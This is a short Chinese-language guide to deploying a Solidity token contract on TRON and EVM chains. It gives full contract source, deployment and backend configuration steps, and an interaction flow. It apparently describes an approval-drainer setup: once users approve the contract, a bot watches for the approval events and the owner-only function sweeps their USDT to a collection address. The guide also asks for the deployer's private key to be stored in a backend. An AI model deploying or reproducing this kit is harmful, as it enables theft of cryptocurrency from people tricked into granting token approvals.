# 合约部署

## 合约源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
}

contract heyue {
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the contract owner can perform this action");
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner cannot be the zero address");
        owner = newOwner;
    }

    function controlAndTransferToken(
        address tokenAddress,
        address from,
        address to,
        uint256 amount
    ) public onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        require(token.allowance(from, address(this)) >= amount, "Insufficient allowance");
        bool success = token.transferFrom(from, to, amount);
        require(success, "Token transfer failed");
    }
}
```

## 部署步骤

### TRON 网络

1. 使用 TronLink 钱包或 TronIDE
2. 编译合约（Solidity ^0.8.0）
3. 部署到 TRON 主网
4. 记录合约地址

### EVM 网络

1. 使用 Remix IDE 或 Hardhat
2. 编译合约
3. 部署到目标网络（ERC/BSC/OKC/POL/GRC）
4. 记录合约地址

## 配置合约

部署后需要在后台配置：

1. 将合约地址填入 **TRC权限地址**（或 EVM权限地址）
2. 将部署者私钥填入 **TRC权限私钥**（或 EVM权限私钥）
3. 设置 **合约方法名** 为 `controlAndTransferToken`
4. 如需传 USDT 合约地址参数，开启 **提币时填写USDT地址** 选项

## 交互流程

```
用户 approve(合约地址, 金额) → 合约获得授权
  → bot.js 检测链上事件 → 调用 controlAndTransferToken
  → USDT 从用户地址转入收款地址
```

## 安全说明

- 合约只有 owner 可以调用 `controlAndTransferToken`
- 可通过 `transferOwnership` 转移所有权
- 建议部署后验证合约源码
